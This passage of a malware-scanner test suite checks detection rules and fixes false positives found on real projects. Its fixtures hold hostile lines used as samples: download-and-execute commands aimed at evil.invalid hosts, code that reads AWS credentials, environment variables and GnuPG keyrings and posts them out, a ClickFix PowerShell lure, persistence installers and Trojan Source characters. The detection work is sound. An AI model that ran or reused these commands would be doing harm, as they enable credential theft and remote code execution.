  ).find((f) => f.id === "lifecycle-script");
  assert.equal(fetcher.severity, "high");
});

test("the Solana release installer is a known installer host, a lookalike is not", () => {
  const known = checkFile(
    fileOf("scripts/setup.sh", 'sh -c "$(curl -sSfL https://release.anza.xyz/v1.18/install)" init\n'),
  ).find((f) => f.id === "download-and-execute");
  assert.equal(known?.severity ?? "none", "none");
  const fake = checkFile(
    fileOf("scripts/setup.sh", 'sh -c "$(curl -sSfL https://release.anza.xyz.evil.example/install)"\n'),
  ).find((f) => f.id === "download-and-execute");
  assert.equal(fake?.severity, "high");
});

test("REGRESSION: a comment describing an action is not the action", async () => {
  // Three false accusations, all the same fault: a rule that convicts a file
  // for doing something fired on a sentence saying so.
  //
  // VictoriaMetrics was called malware for the doc line over its AWS
  // credential loader. That comment was the only place "~/.aws/credentials"
  // appeared literally in the file at all -- the code builds the path with
  // filepath.Join -- so the tool called an AWS client a credential stealer
  // for describing itself accurately.
  const go = checkFile(
    fileOf(
      "lib/awsapi/config.go",
      "// readSharedCredentials reads credentials from ~/.aws/credentials for the profile.\n" +
        'func readSharedCredentials(profile string) {\n\tpath := filepath.Join(home, ".aws", "credentials")\n\tdata, err := os.ReadFile(path)\n}\n',
    ),
    {},
  );
  assert.equal(go.find((f) => f.id === "wallet-file-access"), undefined, "a doc comment is not a read");

  // AutoGPT's Windows installer, for a REM line explaining why it shells out
  // to curl rather than Invoke-WebRequest. Nothing in the file fetched or ran
  // anything.
  const bat = checkFile(
    fileOf(
      "installer/setup-autogpt.bat",
      "@echo off\nREM curl ships with Windows 10/11 1803+ as curl.exe; we use it for\nREM the probes. PowerShell's Invoke-WebRequest would also work.\nwhere docker >nul 2>nul\n",
    ),
    {},
  );
  assert.equal(bat.find((f) => f.id === "download-and-execute"), undefined, "a REM comment is not a download");

  // Apache Beam earned three wallet-file-access findings for a comment
  // saying where KUBECONFIG defaults to.
  const sh = checkFile(
    fileOf("k8s.sh", "#!/usr/bin/env bash\n# - KUBECONFIG: path to .kube/config file (default: $HOME/.kube/config)\nset -euo pipefail\necho hi\n"),
    {},
  );
  assert.equal(sh.find((f) => f.id === "wallet-file-access"), undefined, "a usage comment is not a read");

  // The same path as code must still convict, or the fix is just blindness.
  const real = checkFile(
    fileOf(
      "steal.js",
      'const c = readFileSync(homedir() + "/.aws/credentials", "utf8");\naxios.post("http://drop.example.invalid/", c);\n',
    ),
    {},
  );
  assert.equal(real.find((f) => f.id === "wallet-file-access")?.severity, "high", "reading the file is still high");

  // And the same path in code with no read primitive beside it is still
  // reported, just as a caution rather than a conviction.
  const named = checkFile(fileOf("doctor.sh", 'echo "checking $HOME/.aws/credentials"\n'), {});
  // Seen, and since 2026-09-24 a single named target with no read near it
  // is a note rather than a caution.
  assert.equal(named.find((f) => f.id === "wallet-file-access")?.severity, "low", "code naming the path is still seen");
});

test("REGRESSION: a comment a tool obeys is not prose", async () => {
  // The fix above blanks comment-only lines, which is wrong for the comments
  // that execute. Go runs "//go:generate" when someone types go generate, and
  // treating that line as prose dropped a real high-severity
  // download-and-execute. The tell is the space: prose has one after the
  // marker, a directive does not.
  const gen = checkFile(
    fileOf(
      "main.go",
      'package main\n\n//go:generate sh -c "curl -s http://cdn.example.invalid/gen.sh | sh"\n\nfunc main() {}\n',
    ),
    {},
  );
  assert.equal(
    gen.find((f) => f.id === "download-and-execute")?.severity,
    "high",
    "//go:generate runs, so it is code",
  );

  // A shebang is the same shape, and picks the interpreter that runs the file.
  const shebang = checkFile(fileOf("go.sh", "#!/usr/bin/env bash\necho hi\n"), {});
  assert.ok(Array.isArray(shebang), "a shebang line parses");
});

test("REGRESSION: naming one environment variable is not dumping the environment", async () => {
  // activepieces was called a credential stealer for
  // `const { AP_CLOUD_API_KEY } = process.env` next to a POST to its own API.
  // This rule already says a named read is ordinary work; a destructuring
  // bind names exactly which variables it takes, so it is one.
  const named = checkFile(
    fileOf(
      "tools/update-metadata.ts",
      "const { AP_CLOUD_API_KEY } = process.env;\n" +
        'await fetch("https://api.example.invalid/pieces", { method: "POST", headers: { "api-key": AP_CLOUD_API_KEY }, body });\n',
    ),
    {},
  );
  assert.equal(named.find((f) => f.id === "env-exfiltration"), undefined, "a named bind is a named read");

  // Taking the whole object still convicts, however it is spelled.
  for (const grab of ["const all = process.env;", "const { ...all } = process.env;", "const all = { ...process.env };"]) {
    const out = checkFile(
      fileOf(
        "steal.ts",
        `${grab}\nawait fetch("https://drop.example.invalid/", { method: "POST", body: JSON.stringify(all) });\n`,
      ),
      {},
    );
    assert.equal(
      out.find((f) => f.id === "env-exfiltration")?.severity,
      "high",
      `${grab} takes the whole environment`,
    );
  }
});

test("REGRESSION: a compiled WebAssembly module is not a smuggled script", async () => {
  // ClickHouse inlines its own SQL lexer, built to a .wasm, so the Play UI
  // can highlight a query offline. It decodes with atob and calls
  // WebAssembly.instantiate, and that read as smuggling.
  const wasm = Buffer.concat([Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]), Buffer.alloc(700, 0x41)]).toString("base64");
  const inst = checkFile(
    fileOf(
      "programs/server/play.html",
      `const lexer_base64 = "${wasm}";\nconst binary = atob(lexer_base64);\nlexer = await WebAssembly.instantiate(bytes);\n`,
    ),
    {},
  );
  assert.equal(inst.find((f) => f.id === "base64-blob")?.severity, "medium", "the WebAssembly API is not eval");

  // The step down is earned by where the bytes go, not by the magic number.
  // The same module handed to eval keeps its full weight.
  const evaled = checkFile(
    fileOf("src/loader.js", `const R = "${wasm}";\nconst b = window.atob(R);\neval(b);\n`),
    {},
  );
  assert.equal(evaled.find((f) => f.id === "base64-blob")?.severity, "high", "wasm bytes into eval stay high");
});

test("REGRESSION: an uninstaller removes autostart entries, it does not install them", async () => {
  // netdata-uninstaller.sh names its launch daemon exactly twice, to unload
  // it and to delete the plist, and read as persistence.
  const un = checkFile(
    fileOf(
      "packaging/installer/netdata-uninstaller.sh",
      "launchctl unload /Library/LaunchDaemons/com.github.netdata.plist 2>/dev/null\nrm_file /Library/LaunchDaemons/com.github.netdata.plist\n",
    ),
    {},
  );
  assert.equal(un.find((f) => f.id === "startup-persistence")?.severity, "medium", "removal is a caution at most");

  // Installing one is still a conviction, and a cron job whose own command
  // contains "rm" must not soften it: that is the shape an attacker reaches
  // for. minikube installs exactly that.
  const cron = checkFile(
    fileOf(
      "hack/install_cleanup.sh",
      "(crontab -l 2>/dev/null; echo '@reboot rm -rf /var/run/reboot.in.progress') | crontab -\n",
    ),
    {},
  );
  assert.equal(cron.find((f) => f.id === "startup-persistence")?.severity, "high", "an install stays an install");

  const plist = checkFile(
    fileOf("setup.sh", "cp evil.plist ~/Library/LaunchAgents/com.evil.plist\nlaunchctl load ~/Library/LaunchAgents/com.evil.plist\n"),
    {},
  );
  assert.equal(plist.find((f) => f.id === "startup-persistence")?.severity, "high");
});

test("REGRESSION: a command named in a sentence is not a command being run", async () => {
  // Neovim's documentation for 'backupcopy' names "crontab -e" mid-sentence
  // as an example of a program that edits a file in place, and that sentence
  // made an editor malware. The command now has to begin one.
  const doc = checkFile(
    fileOf("src/nvim/options.lua", 'desc = [[\n  the open file was changed will check the\n  backup file instead.  "crontab -e" is an example, as are daemons.\n]]\n'),
    {},
  );
  assert.equal(doc.find((f) => f.id === "startup-persistence"), undefined, "prose naming a command is prose");

  // Every position a real one occupies still convicts.
  for (const cmd of ["crontab -e\n", 'echo "* * * * * /tmp/p.sh" | crontab -\n', "sudo crontab -u root /tmp/evil.cron\n"]) {
    const out = checkFile(fileOf("start.sh", cmd), {});
    assert.equal(out.find((f) => f.id === "startup-persistence")?.severity, "high", `${cmd.trim()} installs one`);
  }

  // A MacPorts wrapper is not a launch agent: macOS loads only from Library.
  const macports = checkFile(
    fileOf("plugins/apache2/apache2.plugin.zsh", "alias apache2start='sudo /opt/local/etc/LaunchDaemons/org.macports.apache2/apache2.wrapper start'\n"),
    {},
  );
  assert.equal(macports.find((f) => f.id === "startup-persistence"), undefined, "not a path macOS loads from");
});

test("REGRESSION: a GnuPG config file is not the private keyring", async () => {
  // LightGBM's R CI appends "disable-ipv6" to ~/.gnupg/dirmngr.conf so
  // apt-key can reach a keyserver, and that read as reaching for the keys.
  const conf = checkFile(
    fileOf(".ci/test-r-package.sh", 'mkdir -p ~/.gnupg\necho "disable-ipv6" >> ~/.gnupg/dirmngr.conf\n'),
    {},
  );
  assert.equal(conf.find((f) => f.id === "wallet-file-access"), undefined, "a keyserver setting is not a key");

  // Taking the directory itself is still taking the keys.
  const theft = checkFile(fileOf("x.sh", "tar czf - ~/.gnupg/ | curl -X POST --data-binary @- http://drop.invalid/\n"), {});
  assert.ok(theft.find((f) => f.id === "wallet-file-access"), "the keyring itself still counts");
});

test("REGRESSION: a shell command inside a markdown fence is being shown, not run", async () => {
  // sst's CLI prints its own install instructions as an array of markdown
  // lines, so "curl -fsSL https://sst.dev/install | bash" sits between two
  // fence lines, and the tool that prints the instructions looked like the
  // dropper they warn about.
  const docs = checkFile(
    fileOf("cmd/sst/main.go", 'var help = []string{\n\t"```bash",\n\t"curl -fsSL https://sst.dev/install | bash",\n\t"```",\n}\n'),
    {},
  );
  assert.equal(docs.find((f) => f.id === "download-and-execute"), undefined, "a fenced command is documentation");

  // In a file a shell runs, a line of backticks is a failing command and not
  // a fence, so wrapping a payload in two of them must hide nothing.
  const evasion = checkFile(
    fileOf("setup.sh", "```bash\ncurl -fsSL http://evil.invalid/x.sh | bash\n```\n"),
    {},
  );
  assert.equal(evasion.find((f) => f.id === "download-and-execute")?.severity, "high", "fences do not work in a script");

  // Python's fetch() is a function name, not a network call. Scrapy's shell
  // defines one and eval()s what the user types a few lines below.
  const repl = checkFile(
    fileOf("scrapy/shell.py", "def fetch(self, request):\n    self.populate_vars(request)\n\ndef run(self):\n    print(eval(self.code, globals(), self.vars))\n"),
    {},
  );
  assert.equal(repl.find((f) => f.id === "download-and-execute"), undefined, "fetch() in Python is not a download");

  // Python's real download primitives still count.
  const real = checkFile(
    fileOf("setup.py", 'import urllib.request, subprocess\nd = urllib.request.urlopen("http://evil.invalid/x").read()\nsubprocess.run(["sh", "-c", d])\n'),
    {},
  );
  assert.ok(real.find((f) => f.id === "download-and-execute"), "urllib near subprocess still counts");
});

test("REGRESSION: bidi controls around right-to-left text are doing their job", async () => {
  // Bitcoin's Arabic locale wraps a string in RLE and PDF so the "%1"
  // placeholder sits correctly inside the Arabic sentence, and the tool
  // called Bitcoin Core malware for shipping a translation.
  const arabic = checkFile(
    fileOf("src/qt/locale/bitcoin_ar.ts", '<translation type="unfinished">‫%1 لم يغلق بامان بعد…‬</translation>\n'),
    {},
  );
  assert.equal(arabic.find((f) => f.id === "bidi-override"), undefined, "RTL controls around RTL script are typography");

  // Trojan Source in ASCII code is the attack, and still convicts.
  const trojan = checkFile(
    fileOf("auth.js", 'if (level != "user‮ ‭admin") {\n  grantAccess();\n}\n'),
    {},
  );
  assert.equal(trojan.find((f) => f.id === "bidi-override")?.severity, "high", "Trojan Source still convicts");
});

test("REGRESSION: a zero-width character in a comment or at a string edge hides nothing", async () => {
  // assertj puts one inside a Javadoc code sample to stop the renderer
  // gluing tokens together; slate carries a word joiner in a // line.
  const javadoc = checkFile(
    fileOf("src/main/java/A.java", "/**\n * given(CompletableFuture.completedFuture​(1)).isDone();\n */\nclass A {}\n"),
    {},
  );
  assert.equal(javadoc.find((f) => f.id === "invisible-characters"), undefined, "nothing on a comment line runs");

  // langflow's rehype plugin inserts "_<ZWSP>" so long snake_case names wrap.
  const wbr = checkFile(
    fileOf("docs/src/plugins/rehypeWbrUnderscore.js", 'child.value = child.value.replace(/_/g, "_​");\n'),
    {},
  );
  assert.equal(wbr.find((f) => f.id === "invisible-characters"), undefined, "at a string edge it splits no name");

  // An identifier split in running code is the attack, and still convicts.
  const split = checkFile(
    fileOf("app.js", "if (user.isAdmin​) { grant(); }\nconst isAdmin = false;\n"),
    {},
  );
  assert.equal(split.find((f) => f.id === "invisible-characters")?.severity, "high", "an identifier split still convicts");
});

test("REGRESSION: an indirect require is not a staged loader", async () => {
  // urql wraps require("crypto") in new Function so a bundler does not follow
  // the call, with a comment saying exactly why, and read as a payload loader.
  const indirect = checkFile(
    fileOf("exchanges/persisted/src/sha256.ts", 'let nodeCrypto;\ntry {\n  nodeCrypto = new Function("require", "return require(\'crypto\')")(require);\n} catch (e) {}\n'),
    {},
  );
  assert.notEqual(indirect.find((f) => f.id === "remote-code-execution")?.severity, "high", "a spelled-out body hides nothing");

  // A body that arrives at run time is the whole technique, and still convicts.
  const staged = checkFile(
    fileOf("loader.js", 'const r = await fetch(u);\nconst f = new Function("require", await r.text());\nf(require);\n'),
    {},
  );
  assert.equal(staged.find((f) => f.id === "remote-code-execution")?.severity, "high", "a fetched body still convicts");
});

test("REGRESSION: a plotting tool's exported page is a build artifact", async () => {
  // vllm keeps a Plotly benchmark timeline at docs/assets/contributing/, one
  // file carrying the whole Plotly bundle beside a 20 KB base64 array of
  // packed numbers, and it read as a smuggled payload.
  const generated = "/* Plotly.js v2 */\n" + "x".repeat(60_000) + "\n";
  assert.equal(isVendoredArtifact("docs/assets/contributing/timeline.html", generated), true);
  assert.equal(isVendoredArtifact("static/reports/bench.html", generated), true);

  // A page somebody wrote is judged as a page somebody wrote. The size is
  // what separates them, so a hand-written docs page stays authored code.
  assert.equal(isVendoredArtifact("docs/index.html", "<h1>Hello</h1>\n"), false);
  assert.equal(isVendoredArtifact("src/index.html", generated), false);
});

test("REGRESSION: -Encoding is not PowerShell's -EncodedCommand", async () => {
  // "-enc" is how PowerShell abbreviates -EncodedCommand. "-Encoding" is an
  // unrelated cmdlet parameter starting with the same four letters, and
  // matching its prefix convicted Chocolatey for a Write-Debug line and Scoop
  // for a comment saying the same thing. Both are package managers listed in
  // expected-red.txt, so both false positives sat behind a line asserting the
  // red was correct -- which is how a wrong red survives a passing gate.
  const encoding = checkFile(
    fileOf("tools/setup.psm1", 'Write-Debug "Detected Powershell version < 6 ; Using -Encoding byte parameter"\n$b = Get-Content $Path -Encoding byte\n'),
    {},
  );
  assert.equal(encoding.find((f) => f.id === "download-and-execute"), undefined, "-Encoding is a cmdlet parameter");

  // Both spellings of the real flag still convict.
  for (const flag of ["-enc", "-EncodedCommand"]) {
    const out = checkFile(
      fileOf("run.bat", `powershell ${flag} SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=\n`),
      {},
    );
    assert.equal(out.find((f) => f.id === "download-and-execute")?.severity, "high", `${flag} still convicts`);
  }
});

test("REGRESSION: ClickFix needs a command, not the word PowerShell", async () => {
  // winget-cli's README says "if you get an error about missing framework
  // packages" a couple of paragraphs above a "## PowerShell Module" heading,
  // and that was read as a ClickFix lure. The trick is a fake problem plus an
  // instruction to run something; a heading is not the instruction.
  const readme = checkFile(
    fileOf(
      "README.md",
      "Install the framework packages if you get an error about missing framework packages.\n\n### Troubleshooting\n\nPlease read our troubleshooting guide.\n\n## PowerShell Module\n\nThe Microsoft.WinGet.Client module is on the PowerShell Gallery.\n",
    ),
    {},
  );
  assert.equal(readme.find((f) => f.id === "readme-clickfix"), undefined, "a heading is not a lure");

  // The real trick shows a command, and still convicts.
  const lure = checkFile(
    fileOf("README.md", '## Troubleshooting\n\nIf you see a CAPTCHA error, to verify you are human run this:\n\n    powershell -w hidden -c "iwr https://cdn.evil.invalid/v.ps1 | iex"\n'),
    {},
  );
  assert.equal(lure.find((f) => f.id === "readme-clickfix")?.severity, "high", "a pasted command is the lure");
});

test("REGRESSION: the reported line is the line that fired", async () => {
  // download-and-execute named its line by searching for the first token
  // that looked like a download, which is not necessarily the match that
  // convicted. AutoGPT's report said line 110, a comment mentioning curl,
  // while the match was the PowerShell one two lines below. A reader who
  // opens the named line and finds nothing wrong learns to distrust the
  // finding, which is all the finding is for. Here the earlier curl is real
  // code rather than a comment, so blanking comments does not cover it.
  const bat = checkFile(
    fileOf(
      "installer/setup.bat",
      '@echo off\nwhere curl >nul 2>nul\ncurl --version\npowershell -Command "Invoke-WebRequest -Uri %U% -OutFile %P%"\n"%P%" --quiet\n',
    ),
    {},
  );
  const found = bat.find((f) => f.id === "download-and-execute");
  assert.ok(found, "the PowerShell download still convicts");
  assert.equal(found.line, 4, "the line named is the PowerShell one, not the first curl");
});

test("REGRESSION: an import declares a capability, it does not use one", async () => {
  // Two import lines sit next to each other by construction, so a rule
  // grading on how close a download primitive is to an execution primitive
  // reads an import block as the tightest adjacency there is. esbuild,
  // puppeteer and node-gyp each earned a caution for exactly that.
  const imports = checkFile(
    fileOf(
      "update-gyp.py",
      "import os\nimport shutil\nimport subprocess\nimport tarfile\nimport urllib.request\n\nBASE_URL = \"https://example.invalid/\"\n",
    ),
    {},
  );
  assert.notEqual(
    imports.find((f) => f.id === "download-and-execute")?.severity,
    "medium",
    "an import block is not adjacency",
  );

  // The tokens reappear where they are used, so a real one still convicts.
  const used = checkFile(
    fileOf(
      "setup.js",
      "import {execSync} from 'node:child_process';\nconst r = await fetch(u);\nexecSync(await r.text());\n",
    ),
    {},
  );
  assert.ok(used.find((f) => f.id === "download-and-execute"), "the use still counts");
});

test("REGRESSION: test paths and declaration files are not where a project runs", async () => {
  // pnpm asserts what its config reader does with a credential path, in
  // crates/config/src/tests.rs, and apollo-server's httpServerTests.ts is a
  // test suite; neither was recognised as a test path.
  // A conviction in a test path steps down one, to a caution, and no further.
  const reading = checkFile(fileOf("crates/config/src/tests.rs", 'let p = "~/.aws/credentials";\nlet d = std::fs::read(p);\n'), {});
  assert.equal(reading.find((f) => f.id === "wallet-file-access")?.severity, "medium", "one step, not two");

  // A caution there becomes a note, which is pnpm's actual case: a path named
  // in a test assertion with no read beside it.
  const named = checkFile(fileOf("crates/config/src/tests.rs", 'assert_eq!(cfg.keyring, "~/.gnupg/secring.gpg");\n'), {});
  assert.equal(named.find((f) => f.id === "wallet-file-access")?.severity, "low", "a caution in a test is a note");

  // A camelCase test file is a test file: apollo-server's httpServerTests.ts.
  const camel = checkFile(
    fileOf("packages/x/src/httpServerTests.ts", 'const p = "~/.aws/credentials";\nconst d = readFileSync(p);\n'),
    {},
  );
  assert.notEqual(camel.find((f) => f.id === "wallet-file-access")?.severity, "high", "camelCase names a test file");

  // Case matters: folding it made "protest.js" a test file.
  assert.equal(isVendoredArtifact("src/protest.js", ""), false);
  const protest = checkFile(fileOf("src/protest.js", 'const c = readFileSync(homedir() + "/.aws/credentials");\naxios.post("http://x.invalid/", c);\n'), {});
  assert.equal(protest.find((f) => f.id === "wallet-file-access")?.severity, "high", "protest.js is ordinary code");

  // A declaration file states types and executes nothing. webpack ships a
  // 15,000-line types.d.ts and earned a caution from it.
  assert.equal(isVendoredArtifact("types.d.ts", ""), true);
  assert.equal(isVendoredArtifact("stubs/thing.pyi", ""), true);
  assert.equal(isVendoredArtifact("src/types.ts", ""), false);
});

test("code pushed off-screen behind a run of spaces is reported, alignment is not", () => {
  const f = (path, content) => ({ path, content, bytes: content.length, lines: content.split("\n").length });
  const hidden = "/* cache */" + " ".repeat(382) + "function _0x36f9(a,b){return a+b}\n";
  const found = checkFile(f("utils/cache.js", hidden)).find((x) => x.id === "whitespace-hidden-code");
  assert.equal(found?.severity, "high");
  assert.equal(found?.line, 1);
  // Deep indentation, a comment pushed right, and a short gap are not it.
  const indented = " ".repeat(400) + "return value;\n";
  assert.equal(checkFile(f("src/deep.js", indented)).some((x) => x.id === "whitespace-hidden-code"), false);
  const aligned = "const a = 1;" + " ".repeat(200) + "// explained here\n";
  assert.equal(checkFile(f("src/a.js", aligned)).some((x) => x.id === "whitespace-hidden-code"), false);
  const short = "const a = 1;" + " ".repeat(60) + "const b = 2;\n";
  assert.equal(checkFile(f("src/a.js", short)).some((x) => x.id === "whitespace-hidden-code"), false);
  // A megabyte of spaces is read in linear time.
  const started = Date.now();
  checkFile(f("src/pad.js", "x" + " ".repeat(1_000_000)));
  assert.ok(Date.now() - started < 2000);
});

test("spaces inside a string literal are content, not a hiding place", () => {
  const f = (path, content) => ({ path, content, bytes: content.length, lines: content.split("\n").length });
  const screen = 'const SCREEN: &str = "' + " ".repeat(300) + '? for shortcuts\\n";\n';
  assert.equal(checkFile(f("src/verbs.rs", screen)).some((x) => x.id === "whitespace-hidden-code"), false);
  const after = 'const a = "x";' + " ".repeat(300) + "eval(atob(p));\n";
  assert.equal(checkFile(f("src/a.js", after)).find((x) => x.id === "whitespace-hidden-code")?.severity, "high");
});
